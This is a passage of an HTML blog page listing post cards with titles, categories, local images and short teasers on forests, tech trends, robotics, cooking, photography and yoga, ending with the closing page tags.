                    <img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/>
                    <p>Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....</p>
                </div><div class='post'>
                    <h2>Decoding Tech Trends</h2>
                    <p>Category: Tech</p>
                    <img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/>
                    <p>An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....</p>
                </div><div class='post'>
                    <h2>The Future of Robotics</h2>
                    <p>Category: Tech</p>
                    <img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/>
                    <p>Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....</p>
                </div><div class='post'>
                    <h2>Mediterranean Diet Secrets</h2>
                    <p>Category: Cooking</p>
                    <img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/>
                    <p>Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....</p>
                </div><div class='post'>
                    <h2>The Art of French Baking</h2>
                    <p>Category: Cooking</p>
                    <img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/>
                    <p>Master the art of French baking with these simple steps for making the perfect croissant....</p>
                </div><div class='post'>
                    <h2>Beyond the Camera Lens</h2>
                    <p>Category: Photography</p>
                    <img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/>
                    <p>Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....</p>
                </div><div class='post'>
                    <h2>Urban Photography Tips</h2>
                    <p>Category: Photography</p>
                    <img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/>
                    <p>Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....</p>
                </div><div class='post'>
                    <h2>The Healing Power of Yoga</h2>
                    <p>Category: Health</p>
                    <img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/>
                    <p>Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....</p>
                </div></div>
</body>
</html>
```
